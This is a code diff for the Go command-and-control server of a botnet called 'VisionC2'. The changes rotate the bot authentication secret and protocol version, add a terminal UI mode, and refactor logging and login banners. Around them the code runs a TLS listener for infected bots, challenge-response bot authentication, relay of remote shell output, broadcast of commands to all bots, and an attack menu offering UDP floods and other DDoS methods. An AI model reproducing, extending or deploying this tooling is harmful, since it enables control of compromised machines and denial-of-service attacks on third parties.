@@ -32,8 +32,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "1a6R7s^W9DAYHc88"
-	PROTOCOL_VERSION = "V1_8"
+	MAGIC_CODE       = "WOnSk$sTaUlG*4FS"
+	PROTOCOL_VERSION = "v2.2.2"
 )
 
 type BotConnection struct {
@@ -77,7 +77,16 @@ var (
 	botConns       []net.Conn
 	commandOrigin  = make(map[string]net.Conn) // botID -> user connection that sent command
 	originLock     sync.RWMutex
+	tuiMode        bool      // Global flag for TUI mode
+	c2StartTime    time.Time // When the C2 server was started
 )
+
+// logMsg prints a message only if not in TUI mode (avoids messing up TUI display)
+func logMsg(format string, args ...interface{}) {
+	if !tuiMode {
+		fmt.Printf(format+"\n", args...)
+	}
+}
 
 type bot struct {
 	arch string
@@ -145,7 +154,7 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64) {
 		if existing.conn != nil {
 			existing.conn.Close()
 		}
-		fmt.Printf("[☾℣☽] Replacing duplicate bot connection: %s (%s)\n", botID, conn.RemoteAddr())
+		logMsg("[☾℣☽] Replacing duplicate bot connection: %s (%s)", botID, conn.RemoteAddr())
 	}
 
 	botConn := &BotConnection{
@@ -164,7 +173,10 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64) {
 	botConns = append(botConns, conn)
 	botCount++
 
-	fmt.Printf("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | IP: %s | Total: %d\n",
+	// Notify TUI of connection
+	LogBotConnection(arch, true)
+
+	logMsg("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | IP: %s | Total: %d",
 		botID, arch, ram, conn.RemoteAddr(), botCount)
 }
 
@@ -179,9 +191,13 @@ func removeBotConnection(botID string) {
 	defer botConnsLock.Unlock()
 
 	if botConn, exists := botConnections[botID]; exists {
+		arch := botConn.arch
 		botConn.conn.Close()
 		delete(botConnections, botID)
 		botCount--
+
+		// Notify TUI of disconnection
+		LogBotConnection(arch, false)
 
 		// Remove from command origin map (tracks user->bot command routing)
 		originLock.Lock()
@@ -217,7 +233,7 @@ func cleanupDeadBots() {
 			// 5 minute timeout - generous to handle network latency
 			if now.Sub(botConn.lastPing) > 5*time.Minute {
 				deadBots = append(deadBots, botID)
-				fmt.Printf("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)\n",
+				logMsg("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)",
 					botID, now.Sub(botConn.lastPing))
 			}
 		}
@@ -237,7 +253,7 @@ func cleanupDeadBots() {
 		botConnsLock.Unlock()
 
 		if len(deadBots) > 0 {
-			fmt.Printf("[CLEANUP] Removed %d dead bots | Total alive: %d\n", len(deadBots), botCount)
+			logMsg("[CLEANUP] Removed %d dead bots | Total alive: %d", len(deadBots), botCount)
 		}
 	}
 }
@@ -265,7 +281,7 @@ func handleBotConnection(conn net.Conn) {
 			if botConn.conn == conn {
 				delete(botConnections, botID)
 				botCount--
-				fmt.Printf("[☾℣☽] Bot disconnected: %s (%s)\n", botID, conn.RemoteAddr())
+				logMsg("[☾℣☽] Bot disconnected: %s (%s)", botID, conn.RemoteAddr())
 				break
 			}
 		}
@@ -292,13 +308,13 @@ func handleBotConnection(conn net.Conn) {
 	}
 	writer.Flush()
 
-	fmt.Printf("[AUTH] Sent challenge to %s\n", conn.RemoteAddr())
+	logMsg("[AUTH] Sent challenge to %s", conn.RemoteAddr())
 
 	// Step 2: Read bot's response
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 	authResponse, err := reader.ReadString('\n')
 	if err != nil {
-		fmt.Printf("[AUTH] Failed to read auth response from %s: %v\n", conn.RemoteAddr(), err)
+		logMsg("[AUTH] Failed to read auth response from %s: %v", conn.RemoteAddr(), err)
 		return
 	}
 
@@ -307,7 +323,7 @@ func handleBotConnection(conn net.Conn) {
 	// Step 3: Verify response
 	expectedResponse := generateAuthResponse(challenge, MAGIC_CODE)
 	if authResponse != expectedResponse {
-		fmt.Printf("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...\n",
+		logMsg("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...",
 			conn.RemoteAddr(),
 			safeSubstring(authResponse, 0, 10),
 			safeSubstring(expectedResponse, 0, 10))
@@ -320,13 +336,13 @@ func handleBotConnection(conn net.Conn) {
 	writer.WriteString("AUTH_SUCCESS\n")
 	writer.Flush()
 
-	fmt.Printf("[AUTH] Authentication successful for %s\n", conn.RemoteAddr())
+	logMsg("[AUTH] Authentication successful for %s", conn.RemoteAddr())
 
 	// Step 5: Wait for bot registration
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 	registerMsg, err := reader.ReadString('\n')
 	if err != nil {
-		fmt.Printf("[AUTH] Failed to read registration from %s: %v\n", conn.RemoteAddr(), err)
+		logMsg("[AUTH] Failed to read registration from %s: %v", conn.RemoteAddr(), err)
 		return
 	}
 
@@ -334,13 +350,13 @@ func handleBotConnection(conn net.Conn) {
 
 	// Parse registration message (expected format: "REGISTER:v1.0:botID:arch")
 	if !strings.HasPrefix(registerMsg, "REGISTER:") {
-		fmt.Printf("[AUTH] Invalid registration format from %s: %s\n", conn.RemoteAddr(), registerMsg)
+		logMsg("[AUTH] Invalid registration format from %s: %s", conn.RemoteAddr(), registerMsg)
 		return
 	}
 
 	parts := strings.Split(registerMsg, ":")
 	if len(parts) < 3 {
-		fmt.Printf("[AUTH] Malformed registration from %s: %s\n", conn.RemoteAddr(), registerMsg)
+		logMsg("[AUTH] Malformed registration from %s: %s", conn.RemoteAddr(), registerMsg)
 		return
 	}
 
@@ -358,7 +374,7 @@ func handleBotConnection(conn net.Conn) {
 
 	// Your existing version check
 	if version != PROTOCOL_VERSION {
-		fmt.Printf("[AUTH] Version mismatch from %s: got %s, expected %s\n",
+		logMsg("[AUTH] Version mismatch from %s: got %s, expected %s",
 			conn.RemoteAddr(), version, PROTOCOL_VERSION)
 		return
 	}
@@ -409,15 +425,18 @@ func handleBotConnection(conn net.Conn) {
 			// Decode Base64
 			decoded, err := base64.StdEncoding.DecodeString(b64Str)
 			if err != nil {
-				fmt.Printf("[BOT-%s] Failed to decode Base64 output: %v\n", botID, err)
-				fmt.Printf("[BOT-%s] Raw Base64: %s...\n", botID, safeSubstring(b64Str, 0, 50))
+				logMsg("[BOT-%s] Failed to decode Base64 output: %v", botID, err)
 			} else {
 				// Format the decoded output nicely
 				output := string(decoded)
-				fmt.Printf("[BOT-%s] Shell Output (%d bytes):\n", botID, len(decoded))
-				fmt.Printf("══════════════════════════════════════════════════════════\n")
-				fmt.Printf("%s\n", output)
-				fmt.Printf("══════════════════════════════════════════════════════════\n")
+
+				// Forward to TUI if active
+				if tuiMode && tuiProgram != nil {
+					tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: output})
+				} else {
+					// Only print to console if not in TUI mode
+					logMsg("[BOT-%s] Shell Output (%d bytes)", botID, len(decoded))
+				}
 
 				// Check if we should forward this to a user
 				originLock.RLock()
@@ -438,7 +457,7 @@ func handleBotConnection(conn net.Conn) {
 		}
 
 		// Handle other bot messages
-		fmt.Printf("[BOT-%s] %s\n", botID, line)
+		logMsg("[BOT-%s] %s", botID, line)
 
 		// Check if we should forward this to a user
 		originLock.RLock()
@@ -671,7 +690,7 @@ func (c *client) showHelpMenu(conn net.Conn) {
 func (c *client) showAttackMenu(conn net.Conn) {
 	conn.Write([]byte("\r\n"))
 	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
-	conn.Write([]byte("\033[1;97m║              \033[1;31m☠ VisionC2 Attack Methods ☠\033[1;97m                   ║\r\n"))
+	conn.Write([]byte("\033[1;97m║              \033[1;31m ℣isionC2 Attack Methods ☠\033[1;97m                   ║\r\n"))
 	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
 	conn.Write([]byte("\033[1;97m║  \033[1;33mLayer 4 (Network)\033[1;97m                                         ║\r\n"))
 	conn.Write([]byte("\033[1;97m║    !udpflood  <ip> <port> <time>  - UDP flood                ║\r\n"))
@@ -699,7 +718,7 @@ func (c *client) showAttackMenu(conn net.Conn) {
 func (c *client) writeHeader(conn net.Conn) {
 	conn.Write([]byte("\r\n"))
 	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
-	conn.Write([]byte(fmt.Sprintf("\033[1;97m║              \033[1;31mVisionC2 Help Menu [%s]\033[1;97m                    ║\r\n", c.getLevelString())))
+	conn.Write([]byte(fmt.Sprintf("\033[1;97m║              \033[1;31m℣isionC2 Help Menu [%s]\033[1;97m                    ║\r\n", c.getLevelString())))
 	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
 }
 
@@ -824,6 +843,13 @@ func (c *client) getLevelString() string {
 // Starts background goroutines for dead bot cleanup
 // Bot server runs TLS on 443, user CLI runs plain TCP
 func main() {
+	// Record C2 start time for uptime tracking
+	c2StartTime = time.Now()
+
+	// Check for split mode flag (TUI is default, --split enables telnet)
+	splitMode := len(os.Args) > 1 && os.Args[1] == "--split"
+	tuiMode = !splitMode
+
 	// First run: Create default root user with random 12-char password
 	if _, fileError := os.ReadFile("users.json"); fileError != nil {
 		password, err := randomString(12)
@@ -853,16 +879,16 @@ func main() {
 	}
 
 	// Load TLS configuration
-	fmt.Println("[INFO] Loading TLS certificates...")
+	logMsg("[INFO] Loading TLS certificates...")
 	tlsConfig := loadTLSConfig()
-	fmt.Println("[INFO] TLS configuration loaded successfully")
+	logMsg("[INFO] TLS configuration loaded successfully")
 
 	// Start dead bot cleanup routine
 	go cleanupDeadBots()
 
 	// Start bot server (TLS ONLY)
 	go func() {
-		fmt.Println("[☾℣☽] Bot TLS server starting on", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
+		logMsg("[☾℣☽] Bot TLS server starting on %s:%s", BOT_SERVER_IP, BOT_SERVER_PORT)
 		botListener, err := tls.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT, tlsConfig)
 		if err != nil {
 			fmt.Println("[FATAL] Error starting bot TLS server:", err)
@@ -870,13 +896,13 @@ func main() {
 		}
 		defer botListener.Close()
 
-		fmt.Println("[☾℣☽] Bot TLS server is running on port 443")
-		fmt.Println("[AUTH] Using magic code authentication:", MAGIC_CODE)
+		logMsg("[☾℣☽] Bot TLS server is running on port 443")
+		logMsg("[AUTH] Using magic code authentication: %s", MAGIC_CODE)
 
 		for {
 			conn, err := botListener.Accept()
 			if err != nil {
-				fmt.Println("Error accepting bot TLS connection:", err)
+				logMsg("Error accepting bot TLS connection: %v", err)
 				continue
 			}
 
@@ -885,8 +911,18 @@ func main() {
 		}
 	}()
 
+	// TUI mode: Start local Bubble Tea interface instead of telnet server
+	if tuiMode {
+		time.Sleep(500 * time.Millisecond) // Let bot server start
+		if err := StartTUI(); err != nil {
+			fmt.Println("Error running TUI:", err)
+			os.Exit(1)
+		}
+		return
+	}
+
 	// Start admin CLI server (plain TCP)
-	fmt.Println("[☾℣☽] Admin CLI server starting on", USER_SERVER_IP+":"+USER_SERVER_PORT)
+	logMsg("[☾℣☽] Admin CLI server starting on %s:%s", USER_SERVER_IP, USER_SERVER_PORT)
 	userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
 	if err != nil {
 		fmt.Println("Error starting user server:", err)
@@ -900,10 +936,10 @@ func main() {
 	for {
 		conn, err := userListener.Accept()
 		if err != nil {
-			fmt.Println("Error accepting user connection:", err)
+			logMsg("Error accepting user connection: %v", err)
 			continue
 		}
-		fmt.Println("[☾℣☽] [User] Connected To Login Port:", conn.RemoteAddr())
+		logMsg("[☾℣☽] [User] Connected To Login Port: %s", conn.RemoteAddr())
 
 		go handleRequest(conn)
 	}
@@ -919,7 +955,7 @@ func validateTLSHandshake(conn net.Conn) {
 	defer func() {
 		// Panic recovery to prevent single bad connection from crashing server
 		if r := recover(); r != nil {
-			fmt.Printf("[PANIC] in validateTLSHandshake: %v\n", r)
+			logMsg("[PANIC] in validateTLSHandshake: %v", r)
 			conn.Close()
 		}
 	}()
@@ -958,7 +994,7 @@ func validateTLSHandshake(conn net.Conn) {
 	}
 
 	if state.Version == tls.VersionTLS13 {
-		fmt.Printf("[ACCEPT] TLS 1.3 connection from %s\n", conn.RemoteAddr())
+		logMsg("[ACCEPT] TLS 1.3 connection from %s", conn.RemoteAddr())
 	} else if !validCiphers[state.CipherSuite] {
 		tlsConn.Close()
 		return
@@ -1048,6 +1084,49 @@ func formatRAM(ramMB int64) string {
 	return fmt.Sprintf("%dMB", ramMB)
 }
 
+// getC2Uptime returns the C2 server uptime as a formatted string
+// Calculates duration since c2StartTime was set in main()
+// Returns human-readable format like "2d 4h 15m" or "45m 30s"
+func getC2Uptime() string {
+	uptime := time.Since(c2StartTime)
+	days := int(uptime.Hours()) / 24
+	hours := int(uptime.Hours()) % 24
+	minutes := int(uptime.Minutes()) % 60
+	seconds := int(uptime.Seconds()) % 60
+
+	if days > 0 {
+		return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
+	} else if hours > 0 {
+		return fmt.Sprintf("%dh %dm %ds", hours, minutes, seconds)
+	} else if minutes > 0 {
+		return fmt.Sprintf("%dm %ds", minutes, seconds)
+	}
+	return fmt.Sprintf("%ds", seconds)
+}
+
+// getArchMap returns a map of architecture -> count of connected bots
+// Thread-safe: uses RLock for concurrent read access
+// Used to display architecture distribution in status bar
+func getArchMap() map[string]int {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+
+	archMap := make(map[string]int)
+	for _, botConn := range botConnections {
+		if botConn.authenticated && botConn.arch != "" {
+			archMap[botConn.arch]++
+		}
+	}
+	return archMap
+}
+
+// getActiveAttackCount returns the number of currently active attacks
+// Uses the ongoingAttacks map to track in-progress attacks
+// Thread-safe read access for UI display
+func getActiveAttackCount() int {
+	return len(ongoingAttacks)
+}
+
 // ============================================================================
 // USER INTERFACE FUNCTIONS
 // Handle visual elements shown to authenticated admin users.
@@ -1060,31 +1139,7 @@ func formatRAM(ramMB int64) string {
 // Uses 256-color ANSI codes (38;5;xxx) for purple/gradient effects
 // Called on login and when user types 'banner' command
 func showBanner(conn net.Conn) {
-	conn.Write([]byte("\033[2J\033[H")) // Clear screen and move cursor to home
-	conn.Write([]byte("\r\n"))
-
-	// All Seeing Eye ASCII Art with integrated status box
-	conn.Write([]byte("\033[38;5;93m                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;99m                        ░░▒▒▓▓████████████████████▓▓▒▒░░\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;105m                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;111m                 ░▓██▓░░  ╔═════════════════════════╗  ░░▓██▓░\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;117m               ▒██▓░     ║\033[38;5;196m  ☾ \033[38;5;231mV I S I O N \033[38;5;196m℣ \033[38;5;231mC 2  \033[38;5;117m  ║   ░▓██▒\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;123m             ▒██▒        ╠═════════════════════════╣        ▒██▒\033[0m\r\n"))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;159m            ▓█▓          ║ \033[38;5;46m●\033[38;5;231m Status:  \033[38;5;46mONLINE\033[38;5;159m       ║         ▓█▓\033[0m\r\n")))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;195m           ▓█▒           ║ \033[38;5;214m◈\033[38;5;231m Bots:    \033[38;5;46m%-4d\033[38;5;195m         ║          ▒█▓\033[0m\r\n", getBotCount())))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;231m          ▒█▓            ║ \033[38;5;214m◈\033[38;5;231m Proto:   \033[38;5;214m%-11s\033[38;5;231m  ║         ▓█▒\033[0m\r\n", PROTOCOL_VERSION)))
-	conn.Write([]byte("\033[38;5;195m           ▓█▒           ║ \033[38;5;214m◈\033[38;5;231m Encrypt: \033[38;5;46mTLS 1.3\033[38;5;195m      ║        ▒█▓\033[0m\r\n"))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;159m            ▓█▓          ║ \033[38;5;214m◈\033[38;5;231m RAM:     \033[38;5;46m%-11s\033[38;5;159m  ║       ▓█▓\033[0m\r\n", formatRAM(getTotalRAM()))))
-	conn.Write([]byte("\033[38;5;123m             ▒██▒        ╠═════════════════════════╣        ▒██▒\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;117m               ▒██▓░     ║\033[38;5;245m  help \033[38;5;240m• \033[38;5;245mattack \033[38;5;240m• \033[38;5;245mexit  \033[38;5;117m ║    ░▓██▒\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;111m                 ░▓██▓░░ ╚═════════════════════════╝  ░░▓██▓░\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;105m                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;99m                        ░░▒▒▓▓████████████████████▓▓▒▒░░\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;93m                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░\033[0m\r\n"))
-	conn.Write([]byte("\r\n"))
-
-	conn.Write([]byte("\033[38;5;240m                   ══════════ ☠ Ready To Strike ☠ ══════════\033[0m\r\n"))
-	conn.Write([]byte("\r\n"))
+	RenderMainBanner(conn)
 }
 
 // authUser handles the login prompt and credential verification for admin users
@@ -1096,85 +1151,38 @@ func showBanner(conn net.Conn) {
 func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 
 	for i := 0; i < 3; i++ { // 3 attempts max
-		conn.Write([]byte("\033[2J\033[H")) // Clear screen
-		conn.Write([]byte("\033[0m"))       // Reset colors
-
-		conn.Write([]byte("\033[2J\033[H")) // Clear screen
-
-		// Neon Futuristic Login - Cyberpunk style
-		conn.Write([]byte("\r\n"))
-		conn.Write([]byte("\033[38;5;51m     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;51m     █\033[38;5;0m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[38;5;51m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;87m     █\033[38;5;0m░\033[38;5;201m╔════════════════════════════════════════════════════╗\033[38;5;0m░\033[38;5;87m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;87m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m                                                    \033[38;5;201m║\033[38;5;0m░\033[38;5;87m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;123m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m██╗   ██╗\033[38;5;87m██╗\033[38;5;123m███████╗\033[38;5;159m██╗\033[38;5;195m ██████╗ \033[38;5;231m███╗   ██╗\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;123m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;123m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m██║   ██║\033[38;5;87m██║\033[38;5;123m██╔════╝\033[38;5;159m██║\033[38;5;195m██╔═══██╗\033[38;5;231m████╗  ██║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;123m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;159m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m██║   ██║\033[38;5;87m██║\033[38;5;123m███████╗\033[38;5;159m██║\033[38;5;195m██║   ██║\033[38;5;231m██╔██╗ ██║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;159m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;159m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m╚██╗ ██╔╝\033[38;5;87m██║\033[38;5;123m╚════██║\033[38;5;159m██║\033[38;5;195m██║   ██║\033[38;5;231m██║╚██╗██║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;159m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;195m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m        \033[38;5;51m╚████╔╝ \033[38;5;87m██║\033[38;5;123m███████║\033[38;5;159m██║\033[38;5;195m╚██████╔╝\033[38;5;231m██║ ╚████║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;195m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;195m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m         \033[38;5;51m╚═══╝  \033[38;5;87m╚═╝\033[38;5;123m╚══════╝\033[38;5;159m╚═╝\033[38;5;195m ╚═════╝ \033[38;5;231m╚═╝  ╚═══╝\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;195m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;231m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m                        \033[38;5;201m☾ \033[38;5;51mC\033[38;5;87m2 \033[38;5;201m℣\033[38;5;0m                         \033[38;5;201m║\033[38;5;0m░\033[38;5;231m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;231m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m                                                    \033[38;5;201m║\033[38;5;0m░\033[38;5;231m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;195m     █\033[38;5;0m░\033[38;5;201m╠════════════════════════════════════════════════════╣\033[38;5;0m░\033[38;5;195m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;159m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m   \033[38;5;51m◢◤\033[38;5;245m AUTHORIZED PERSONNEL ONLY \033[38;5;51m◢◤\033[38;5;0m   \033[38;5;196m⚠ MONITORED ⚠\033[38;5;0m   \033[38;5;201m║\033[38;5;0m░\033[38;5;159m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;123m     █\033[38;5;0m░\033[38;5;201m╚════════════════════════════════════════════════════╝\033[38;5;0m░\033[38;5;123m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;87m     █\033[38;5;0m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[38;5;87m█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;51m     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0m\r\n"))
-		conn.Write([]byte("\r\n"))
+		// Render login banner using ui.go function
+		RenderLoginBanner(conn)
 
 		// Attempt counter
 		if i > 0 {
-			conn.Write([]byte(fmt.Sprintf("\033[38;5;196m              ⚠ \033[38;5;231mLogin attempt \033[38;5;51m%d\033[38;5;231m of \033[38;5;51m3\033[38;5;231m - \033[38;5;196mAccess denied\033[0m\r\n\r\n", i)))
+			RenderAttemptCounter(conn, i)
 		}
 
-		// Neon input box
-		conn.Write([]byte("\033[38;5;201m     ┌─────────────────────────────────────────────────────┐\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;201m     │ \033[38;5;51m⬡\033[38;5;231m USER  \033[38;5;201m│\033[0m "))
+		// Input prompts
+		RenderInputBox(conn)
+		RenderUserPrompt(conn)
 
 		username, err := getFromConnReader(reader)
 		if err != nil {
 			return false, nil
 		}
 
-		conn.Write([]byte("\033[38;5;201m     │ \033[38;5;196m⬡\033[38;5;231m PASS  \033[38;5;201m│\033[38;5;0m\033[48;5;0m "))
+		RenderPasswordPrompt(conn)
 
 		password, err := getFromConnReader(reader)
 		if err != nil {
 			return false, nil
 		}
 
-		conn.Write([]byte("\033[0m"))
-		conn.Write([]byte("\033[38;5;201m     └─────────────────────────────────────────────────────┘\033[0m\r\n"))
+		RenderInputBoxClose(conn)
 
-		// Authentication animation - neon style
-		conn.Write([]byte("\r\n"))
-		authFrames := []string{
-			"     \033[38;5;51m[\033[38;5;201m■\033[38;5;240m□□□□□□□□□\033[38;5;51m]\033[38;5;245m Initializing secure tunnel...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■\033[38;5;240m□□□□□□□□\033[38;5;51m]\033[38;5;245m Encrypting handshake...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■■\033[38;5;240m□□□□□□□\033[38;5;51m]\033[38;5;245m Validating credentials...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■■■\033[38;5;240m□□□□□□\033[38;5;51m]\033[38;5;245m Checking access matrix...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■■■■\033[38;5;240m□□□□□\033[38;5;51m]\033[38;5;245m Decrypting session key...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■■■■■\033[38;5;240m□□□□\033[38;5;51m]\033[38;5;245m Establishing neural link...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■■■■■■\033[38;5;240m□□□\033[38;5;51m]\033[38;5;245m Loading user profile...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■■■■■■■\033[38;5;240m□□\033[38;5;51m]\033[38;5;245m Syncing botnet status...\033[0m",
-			"     \033[38;5;51m[\033[38;5;201m■■■■■■■■■\033[38;5;240m□\033[38;5;51m]\033[38;5;245m Finalizing connection...\033[0m",
-			"     \033[38;5;51m[\033[38;5;46m■■■■■■■■■■\033[38;5;51m]\033[38;5;46m Complete!\033[0m",
-		}
-		for _, frame := range authFrames {
-			conn.Write([]byte(fmt.Sprintf("\r%s", frame)))
-			time.Sleep(100 * time.Millisecond)
-		}
-		conn.Write([]byte("\r\n"))
+		// Authentication animation
+		RenderAuthAnimation(conn)
 
 		if exists, user := AuthUser(username, password); exists {
-			// Success animation - neon green
-			conn.Write([]byte("\r\n"))
-			conn.Write([]byte("\033[38;5;51m     ╔══════════════════════════════════════════════════════╗\033[0m\r\n"))
-			conn.Write([]byte("\033[38;5;51m     ║  \033[38;5;46m✓ ACCESS GRANTED\033[38;5;51m  │  \033[38;5;231mWELCOME TO THE GRID\033[38;5;51m  │  \033[38;5;201m☾℣☽\033[38;5;51m  ║\033[0m\r\n"))
-			conn.Write([]byte("\033[38;5;51m     ╚══════════════════════════════════════════════════════╝\033[0m\r\n"))
-			time.Sleep(800 * time.Millisecond)
-
-			conn.Write([]byte("\033[2J\033[H")) // Clear screen
+			RenderAccessGranted(conn)
+			conn.Write([]byte(ClearScreen))
 
 			loggedClient := &client{
 				conn: conn,
@@ -1184,26 +1192,11 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 			return true, loggedClient
 		}
 
-		// Failed animation - neon red
-		conn.Write([]byte("\r\n"))
-		conn.Write([]byte("\033[38;5;196m     ╔══════════════════════════════════════════════════════╗\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;196m     ║  \033[38;5;231m✗ ACCESS DENIED\033[38;5;196m  │  \033[38;5;245mINVALID CREDENTIALS\033[38;5;196m  │  \033[38;5;201m⚠\033[38;5;196m   ║\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;196m     ╚══════════════════════════════════════════════════════╝\033[0m\r\n"))
-		time.Sleep(1500 * time.Millisecond)
+		RenderAccessDenied(conn)
 	}
 
-	// Final lockout message - neon warning
-	conn.Write([]byte("\033[2J\033[H"))
-	conn.Write([]byte("\r\n\r\n\r\n"))
-	conn.Write([]byte("\033[38;5;196m     ╔══════════════════════════════════════════════════════════╗\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m     ║\033[38;5;0m                                                          \033[38;5;196m║\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m     ║  \033[38;5;231m☠ \033[38;5;196mSECURITY LOCKOUT\033[38;5;231m ☠  \033[38;5;245mToo many failed attempts\033[38;5;196m       ║\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m     ║\033[38;5;0m                                                          \033[38;5;196m║\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m     ║  \033[38;5;51m◢◤\033[38;5;245m Your connection has been logged and flagged \033[38;5;51m◢◤\033[38;5;196m   ║\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m     ║\033[38;5;0m                                                          \033[38;5;196m║\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m     ╚══════════════════════════════════════════════════════════╝\033[0m\r\n"))
-	time.Sleep(2 * time.Second)
-
+	// Final lockout message
+	RenderLockout(conn)
 	conn.Close()
 	return false, nil
 }
@@ -1359,7 +1352,7 @@ func sendToBots(command string) {
 		if botConn.authenticated {
 			_, err := botConn.conn.Write([]byte(command + "\n"))
 			if err != nil {
-				fmt.Printf("[ERROR] Failed to send to bot %s: %v\n", botConn.botID, err)
+				logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
 				// Mark for cleanup in background (don't block other sends)
 				go removeBotConnection(botConn.botID)
 			} else {
@@ -1368,7 +1361,87 @@ func sendToBots(command string) {
 		}
 	}
 
-	fmt.Printf("[COMMAND] Sent to %d/%d bots: %s\n", sentCount, len(botConnections), command)
+	logMsg("[COMMAND] Sent to %d/%d bots: %s", sentCount, len(botConnections), command)
+}
+
+// sendToFilteredBots sends a command to bots matching the specified filters
+// archFilter: filter by architecture (empty = all)
+// minRAM: minimum RAM in MB (0 = no filter)
+// maxBots: max bots to send to (0 = all)
+// Returns the count of bots sent to
